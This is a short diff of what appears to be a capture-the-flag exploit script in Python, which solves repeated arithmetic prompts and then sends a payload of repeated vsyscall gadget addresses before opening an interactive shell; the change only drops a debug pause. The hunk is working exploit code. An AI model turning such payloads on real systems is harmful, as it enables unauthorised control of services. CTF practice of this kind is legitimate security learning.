@@ -35,8 +35,6 @@ for i in range(999):
 data = p.recvuntil("Answer:")
 ques = data.split(":")[1].split("=")[0].strip()
 res = int(ques.split("*")[0].strip()) * int(ques.split("*")[1].strip())
-
 payload = p64(vsys_gadget) * 10
-raw_input("1000 levels!")
 p.send(payload)
 p.interactive()
